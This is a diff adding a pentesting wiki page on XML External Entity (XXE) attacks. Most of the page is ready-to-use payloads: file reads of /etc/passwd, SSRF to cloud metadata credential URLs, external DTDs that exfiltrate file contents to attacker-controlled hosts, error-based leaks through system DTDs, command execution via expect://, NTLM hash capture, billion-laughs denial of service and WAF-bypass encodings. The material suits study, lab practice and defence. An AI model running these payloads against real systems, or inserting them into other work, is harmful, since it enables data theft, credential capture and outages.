@@ -1,0 +1,923 @@
+# XXE - XEE - XML External Entity
+
+{{#include ../banners/hacktricks-training.md}}
+
+## XML Basics
+
+XML is a markup language designed for data storage and transport, featuring a flexible structure that allows for the use of descriptively named tags. It differs from HTML by not being limited to a set of predefined tags. XML's significance has declined with the rise of JSON, despite its initial role in AJAX technology.<sup>[[2]](#references)</sup>
+
+- **Data Representation through Entities**: Entities in XML enable the representation of data, including special characters like `&lt;` and `&gt;`, which correspond to `<` and `>` to avoid conflict with XML's tag system.
+- **Defining XML Elements**: XML allows for the definition of element types, outlining how elements should be structured and what content they may contain, ranging from any type of content to specific child elements.
+- **Document Type Definition (DTD)**: DTDs are crucial in XML for defining the document's structure and the types of data it can contain. They can be internal, external, or a combination, guiding how documents are formatted and validated.
+- **Custom and External Entities**: XML supports the creation of custom entities within a DTD for flexible data representation. External entities, defined with a URL, raise security concerns, particularly in the context of XML External Entity (XXE) attacks, which exploit the way XML parsers handle external data sources: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
+- **XXE Detection with Parameter Entities**: For detecting XXE vulnerabilities, especially when conventional methods fail due to parser security measures, XML parameter entities can be utilized. These entities allow for out-of-band detection techniques, such as triggering DNS lookups or HTTP requests to a controlled domain, to confirm the vulnerability.
+  - `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
+  - `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`
+
+## Main attacks
+
+[**Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)<sup>[[8]](#references)</sup>
+
+### New Entity test
+
+In this attack I'm going to test if a simple new ENTITY declaration is working
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
+<stockCheck>
+    <productId>&toreplace;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+
+![Main attacks - New Entity test: Lets try to read /etc/passwd in different ways. For Windows you could try to read: C: windows system32 drivers etc hosts](<../images/image (870).png>)
+
+### Read file
+
+Lets try to read `/etc/passwd` in different ways. For Windows you could try to read: `C:\windows\system32\drivers\etc\hosts`
+
+In this first case notice that SYSTEM "_**file:///**etc/passwd_" will also work.
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+<data>&example;</data>
+```
+
+![New Entity test - Read file: This second case should be useful to extract a file if the web server is using PHP (Not the case of Portswiggers labs)](<../images/image (86).png>)
+
+This second case should be useful to extract a file if the web server is using PHP (Not the case of Portswiggers labs)
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<data>&example;</data>
+```
+
+In this third case notice we are declaring the `Element stockCheck` as ANY
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+<!ELEMENT stockCheck ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<stockCheck>
+    <productId>&file;</productId>
+    <storeId>1</storeId>
+</stockCheck3>
+```
+
+![New Entity test - Read file: In Java based applications it might be possible to list the contents of a directory via XXE with a payload like (just asking for the directory instead of the...](<../images/image (753).png>)
+
+### Directory listing
+
+In **Java** based applications it might be possible to **list the contents of a directory** via XXE with a payload like (just asking for the directory instead of the file):
+
+```xml
+<!-- Root / -->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///"><root><foo>&xxe;</foo></root>
+
+<!-- /etc/ -->
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
+```
+
+### SSRF
+
+An XXE could be used to abuse a SSRF inside a cloud
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+### Blind SSRF
+
+Using the **previously commented technique** you can make the server access a server you control to show it's vulnerable. But, if that's not working, maybe is because **XML entities aren't allowed**, in that case you could try using **XML parameter entities**:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+```
+
+### "Blind" SSRF - Exfiltrate data out-of-band
+
+**In this occasion we are going to make the server load a new DTD with a malicious payload that will send the content of a file via HTTP request (for multi-line files you could try to ex-filtrate it via \_ftp://**\_ using this basic server for example [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). This explanation is based in** [**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind)**.**<sup>[[8]](#references)</sup>
+
+In the given malicious DTD, a series of steps are conducted to exfiltrate data:
+
+### Malicious DTD Example:
+
+The structure is as follows:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+The steps executed by this DTD include:
+
+1. **Definition of Parameter Entities:**
+   - An XML parameter entity, `%file`, is created, reading the content of the `/etc/hostname` file.
+   - Another XML parameter entity, `%eval`, is defined. It dynamically declares a new XML parameter entity, `%exfiltrate`. The `%exfiltrate` entity is set to make an HTTP request to the attacker's server, passing the content of the `%file` entity within the query string of the URL.
+2. **Execution of Entities:**
+   - The `%eval` entity is utilized, leading to the execution of the dynamic declaration of the `%exfiltrate` entity.
+   - The `%exfiltrate` entity is then used, triggering an HTTP request to the specified URL with the file's contents.
+
+The attacker hosts this malicious DTD on a server under their control, typically at a URL like `http://web-attacker.com/malicious.dtd`.
+
+**XXE Payload:** To exploit a vulnerable application, the attacker sends an XXE payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+```
+
+This payload defines an XML parameter entity `%xxe` and incorporates it within the DTD. When processed by an XML parser, this payload fetches the external DTD from the attacker's server. The parser then interprets the DTD inline, executing the steps outlined in the malicious DTD and leading to the exfiltration of the `/etc/hostname` file to the attacker's server.
+
+### Error Based(External DTD)
+
+**In this case we are going to make the server loads a malicious DTD that will show the content of a file inside an error message (this is only valid if you can see error messages).** [**Example from here.**](https://portswigger.net/web-security/xxe/blind)
+
+An XML parsing error message, revealing the contents of the `/etc/passwd` file, can be triggered using a malicious external Document Type Definition (DTD). This is accomplished through the following steps:<sup>[[6]](#references)</sup>
+
+1. An XML parameter entity named `file` is defined, which contains the contents of the `/etc/passwd` file.
+2. An XML parameter entity named `eval` is defined, incorporating a dynamic declaration for another XML parameter entity named `error`. This `error` entity, when evaluated, attempts to load a nonexistent file, incorporating the contents of the `file` entity as its name.
+3. The `eval` entity is invoked, leading to the dynamic declaration of the `error` entity.
+4. Invocation of the `error` entity results in an attempt to load a nonexistent file, producing an error message that includes the contents of the `/etc/passwd` file as part of the file name.
+
+The malicious external DTD can be invoked with the following XML:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [<!ENTITY % error_dtd SYSTEM "http://web-attacker.com/error.dtd"> %error_dtd;]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+```
+
+Upon execution, the web server's response should include an error message displaying the contents of the `/etc/passwd` file.
+
+![Malicious DTD Example - Error Based(External DTD): Error Based (system DTD)](<../images/image (809).png>)
+
+_**Please notice that external DTD allows us to include one entity inside the second `eval`), but it is prohibited in the internal DTD. Therefore, you can't force an error without using an external DTD (usually).**_
+
+### **Error Based (system DTD)**
+
+So what about blind XXE vulnerabilities when **out-of-band interactions are blocked** (external connections aren't available)?
+
+A loophole in the XML language specification can **expose sensitive data through error messages when a document's DTD blends internal and external declarations**. This issue allows for the internal redefinition of entities declared externally, facilitating the execution of error-based XXE attacks. Such attacks exploit the redefinition of an XML parameter entity, originally declared in an external DTD, from within an internal DTD. When out-of-band connections are blocked by the server, attackers must rely on local DTD files to conduct the attack, aiming to induce a parsing error to reveal sensitive information.<sup>[[9]](#references)</sup>
+
+Consider a scenario where the server's filesystem contains a DTD file at `/usr/local/app/schema.dtd`, defining an entity named `custom_entity`. An attacker can induce an XML parsing error revealing the contents of the `/etc/passwd` file by submitting a hybrid DTD as follows:
+
+```xml
+<!DOCTYPE foo [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+    <!ENTITY % custom_entity '
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file'>">
+        %eval;
+        %error;
+    '>
+    %local_dtd;
+]>
+```
+
+The outlined steps are executed by this DTD:
+
+- The definition of an XML parameter entity named `local_dtd` includes the external DTD file located on the server's filesystem.
+- A redefinition occurs for the `custom_entity` XML parameter entity, originally defined in the external DTD, to encapsulate an [error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). This redefinition is designed to elicit a parsing error, exposing the contents of the `/etc/passwd` file.
+- By employing the `local_dtd` entity, the external DTD is engaged, encompassing the newly defined `custom_entity`. This sequence of actions precipitates the emission of the error message aimed for by the exploit.
+
+**Real world example:** Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso`
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % ISOamso '
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
+        %eval;
+        %error;
+    '>
+    %local_dtd;
+]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+```
+
+![Error Based(External DTD) - Error Based (system DTD): As this technique uses an internal DTD you need to find a valid one first . You could do this installing the same OS / Software the...](<../images/image (625).png>)
+
+As this technique uses an **internal DTD you need to find a valid one first**. You could do this **installing** the same **OS / Software** the server is using and **searching some default DTDs**, or **grabbing a list** of **default DTDs** inside systems and **check** if any of them exists:
+
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+
+For more information check [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)
+
+### Finding DTDs inside the system
+
+In the following awesome github repo you can find **paths of DTDs that can be present in the system**:
+
+
+{{#ref}}
+https://github.com/GoSecure/dtd-finder/tree/master/list
+{{#endref}}
+
+Moreover, if you have the **Docker image of the victim system**, you can use the tool of the same repo to **scan** the **image** and **find** the path of **DTDs** present inside the system. Read the [Readme of the github](https://github.com/GoSecure/dtd-finder) to learn how.
+
+```bash
+java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar
+
+Scanning TAR file /tmp/dadocker.tar
+
+ [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
+Testing 0 entities : []
+
+ [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
+Testing 0 entities : []
+```
+
+### XXE via Office Open XML Parsers
+
+Office Open XML formats are ZIP archives containing XML parts. A real PhpSpreadsheet advisory demonstrates that placing an external-entity declaration in an XLSX part such as `xl/sharedStrings.xml` can trigger XXE when the server extracts and parses the workbook.<sup>[[15]](#references)</sup> A dedicated OOXML lab provides additional attack context and worked DOCX/XLSX examples.<sup>[[19]](#references)</sup>
+
+The ability to **upload Microsoft Office documents is offered by many web applications**, which then proceed to extract certain details from these documents. For instance, a web application may allow users to import data by uploading an XLSX format spreadsheet. In order for the parser to extract the data from the spreadsheet, it will inevitably need to parse at least one XML file.
+
+To test for this vulnerability, it is necessary to create a **Microsoft Office file containing an XXE payload**. The first step is to create an empty directory to which the document can be unzipped.
+
+Once the document has been unzipped, the XML file located at `./unzipped/word/document.xml` should be opened and edited in a preferred text editor (such as vim). The XML should be modified to include the desired XXE payload, often starting with an HTTP request.
+
+The modified XML lines should be inserted between the two root XML objects. It is important to replace the URL with a monitorable URL for requests.
+
+Finally, the file can be zipped up to create the malicious poc.docx file. From the previously created "unzipped" directory, the following command should be run:
+
+Now, the created file can be uploaded to the potentially vulnerable web application, and one can hope for a request to appear in the Burp Collaborator logs.
+
+### Jar: protocol
+
+The **jar** protocol is made accessible exclusively within **Java applications**. It is designed to enable file access within a **PKZIP** archive (e.g., `.zip`, `.jar`, etc.), catering to both local and remote files.<sup>[[9]](#references)</sup>
+
+```
+jar:file:///var/myarchive.zip!/file.txt
+jar:https://download.host.com/myarchive.zip!/file.txt
+```
+
+> [!CAUTION]
+> To be able to access files inside PKZIP files is **super useful to abuse XXE via system DTD files.** Check [this section to learn how to abuse system DTD files](xxe-xee-xml-external-entity.md#error-based-system-dtd).
+
+The process behind accessing a file within a PKZIP archive via the jar protocol involves several steps:
+
+1. An HTTP request is made to download the zip archive from a specified location, such as `https://download.website.com/archive.zip`.
+2. The HTTP response containing the archive is stored temporarily on the system, typically in a location like `/tmp/...`.
+3. The archive is then extracted to access its contents.
+4. The specific file within the archive, `file.zip`, is read.
+5. After the operation, any temporary files created during this process are deleted.
+
+An interesting technique to interrupt this process at the second step involves keeping the server connection open indefinitely when serving the archive file. Tools available at [this repository](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) can be utilized for this purpose, including a Python server (`slow_http_server.py`) and a Java server (`slowserver.jar`).
+
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
+<foo>&xxe;</foo>
+```
+
+> [!CAUTION]
+> Writing files in a temporary directory can help to **escalate another vulnerability that involves a path traversal** (such as local file include, template injection, XSLT RCE, deserialization, etc).
+
+### XSS
+
+```xml
+<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
+```
+
+### DoS
+
+#### Billion Laugh Attack
+
+```xml
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+```
+
+#### Yaml Attack
+
+```xml
+a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+```
+
+#### Quadratic Blowup Attack
+
+![Yaml Attack - Quadratic Blowup Attack: Quadratic Blowup Attack](<../images/image (527).png>)
+
+#### Getting NTML
+
+On Windows hosts it is possible to get the NTML hash of the web server user by setting a responder.py handler:
+
+```bash
+Responder.py -I eth0 -v
+```
+
+and by sending the following request
+
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
+<data>&example;</data>
+```
+
+Then you can try to crack the hash using hashcat
+
+## Hidden XXE Surfaces
+
+### XInclude
+
+When integrating client data into server-side XML documents, like those in backend SOAP requests, direct control over the XML structure is often limited, hindering traditional XXE attacks due to restrictions on modifying the `DOCTYPE` element. However, an `XInclude` attack provides a solution by allowing the insertion of external entities within any data element of the XML document. This method is effective even when only a portion of the data within a server-generated XML document can be controlled.
+
+To execute an `XInclude` attack, the `XInclude` namespace must be declared, and the file path for the intended external entity must be specified. Below is a succinct example of how such an attack can be formulated:
+
+```xml
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+```
+
+Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!<sup>[[8]](#references)</sup>
+
+### SVG - File Upload
+
+Files uploaded by users to certain applications, which are then processed on the server, can exploit vulnerabilities in how XML or XML-containing file formats are handled. Common file formats like office documents (DOCX) and images (SVG) are based on XML.
+
+When users **upload images**, these images are processed or validated server-side. Even for applications expecting formats such as PNG or JPEG, the **server's image processing library might also support SVG images**. SVG, being an XML-based format, can be exploited by attackers to submit malicious SVG images, thereby exposing the server to XXE (XML External Entity) vulnerabilities.
+
+An example of such an exploit is shown below, where a malicious SVG image attempts to read system files:
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
+```
+
+Another method involves attempting to **execute commands** through the PHP "expect" wrapper:
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+```
+
+In both instances, the SVG format is used to launch attacks that exploit the XML processing capabilities of the server's software, highlighting the need for robust input validation and security measures.
+
+Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!<sup>[[8]](#references)</sup>
+
+**Note the first line of the read file or of the result of the execution will appear INSIDE the created image. So you need to be able to access the image SVG has created.**
+
+### **PDF - File upload**
+
+Read the following post to **learn how to exploit a XXE uploading a PDF** file:
+
+
+{{#ref}}
+file-upload/pdf-upload-xxe-and-cors-bypass.md
+{{#endref}}
+
+### Content-Type: From x-www-urlencoded to XML
+
+If a POST request accepts the data in XML format, you could try to exploit a XXE in that request. For example, if a normal request contains the following:<sup>[[7]](#references)</sup>
+
+```xml
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+Then you might be able submit the following request, with the same result:
+
+```xml
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
+
+### Content-Type: From JSON to XEE
+
+To change the request you could use a Burp Extension named “**Content Type Converter**“. [Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) you can find this example:
+
+```xml
+Content-Type: application/json;charset=UTF-8
+
+{"root": {"root": {
+  "firstName": "Avinash",
+  "lastName": "",
+  "country": "United States",
+  "city": "ddd",
+  "postalCode": "ddd"
+}}}
+```
+
+```xml
+Content-Type: application/xml;charset=UTF-8
+
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
+<root>
+ <root>
+  <firstName>&xxe;</firstName>
+  <lastName/>
+  <country>United States</country>
+  <city>ddd</city>
+  <postalCode>ddd</postalCode>
+ </root>
+</root>
+```
+
+Another example can be found [here](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).<sup>[[18]](#references)</sup>
+
+## WAF & Protections Bypasses
+
+### Base64
+
+```xml
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+```
+
+This only work if the XML server accepts the `data://` protocol.<sup>[[3]](#references)</sup>
+
+### UTF-7
+
+You can use the \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/index.html#recipe=Encode_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/index.html#recipe=Encode_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transform to UTF-7.
+
+```xml
+<!xml version="1.0" encoding="UTF-7"?-->
++ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-7"?>
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
+```
+
+### File:/ Protocol Bypass
+
+If the web is using PHP, instead of using `file:/` you can use **php wrappers**`php://filter/convert.base64-encode/resource=` to **access internal files**.<sup>[[5]](#references)</sup>
+
+If the web is using Java you may check the [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).
+
+### HTML Entities
+
+Trick from [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
+You can create an **entity inside an entity** encoding it with **html entities** and then call it to **load a dtd**.\
+Note that the **HTML Entities** used needs to be **numeric** (like \[in this example]\([https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](<https://gchq.github.io/CyberChef/index.html#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C>)).
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "<&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
+<data>
+    <env>&exfil;</env>
+</data>
+```
+
+DTD example:
+
+```xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
+<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
+%abt;
+%exfil;
+```
+
+## PHP Wrappers
+
+### Base64
+
+**Extract** _**index.php**_
+
+```xml
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+```
+
+#### **Extract external resource**
+
+```xml
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
+```
+
+### Remote code execution
+
+**If PHP "expect" module is loaded**
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
+
+## **SOAP - XEE**
+
+```xml
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+```
+
+## XLIFF - XXE
+
+This example is inspired in [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)<sup>[[16]](#references)</sup>
+
+XLIFF (XML Localization Interchange File Format) is utilized to standardize data exchange in localization processes. It's an XML-based format primarily used for transferring localizable data among tools during localization and as a common exchange format for CAT (Computer-Aided Translation) tools.
+
+### Blind Request Analysis
+
+A request is made to the server with the following content:
+
+```xml
+------WebKitFormBoundaryqBdAsEtYaBjTArl3
+Content-Disposition: form-data; name="file"; filename="xxe.xliff"
+Content-Type: application/x-xliff+xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE XXE [
+<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
+<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
+------WebKitFormBoundaryqBdAsEtYaBjTArl3--
+```
+
+However, this request triggers an internal server error, specifically mentioning a problem with the markup declarations:
+
+```json
+{
+  "status": 500,
+  "error": "Internal Server Error",
+  "message": "Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."
+}
+```
+
+Despite the error, a hit is recorded on Burp Collaborator, indicating some level of interaction with the external entity.
+
+Out of Band Data Exfiltration To exfiltrate data, a modified request is sent:
+
+```
+------WebKitFormBoundaryqBdAsEtYaBjTArl3
+Content-Disposition: form-data; name="file"; filename="xxe.xliff"
+Content-Type: application/x-xliff+xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE XXE [
+<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
+<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
+------WebKitFormBoundaryqBdAsEtYaBjTArl3--
+```
+
+This approach reveals that the User Agent indicates the use of Java 1.8. A noted limitation with this version of Java is the inability to retrieve files containing a newline character, such as /etc/passwd, using the Out of Band technique.
+
+Error-Based Data Exfiltration To overcome this limitation, an Error-Based approach is employed. The DTD file is structured as follows to trigger an error that includes data from a target file:
+
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
+%foo;
+%xxe;
+```
+
+The server responds with an error, importantly reflecting the non-existent file, indicating that the server is attempting to access the specified file:
+
+```javascript
+{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
+```
+
+To include the file's content in the error message, the DTD file is adjusted:
+
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
+%foo;
+%xxe;
+```
+
+This modification leads to the successful exfiltration of the file's content, as it is reflected in the error output sent via HTTP. This indicates a successful XXE (XML External Entity) attack, leveraging both Out of Band and Error-Based techniques to extract sensitive information.
+
+## RSS - XEE
+
+Valid XML with RSS format to exploit an XXE vulnerability.<sup>[[4]](#references)</sup>
+
+### Ping back
+
+Simple HTTP request to attackers server
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>XXE Test Blog</title>
+<link>http://example.com/</link>
+<description>XXE Test Blog</description>
+<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
+<item>
+<title>&xxe;</title>
+<link>http://example.com</link>
+<description>Test Post</description>
+<author>author@example.com</author>
+<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
+</item>
+</channel>
+</rss>
+```
+
+### Read file
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
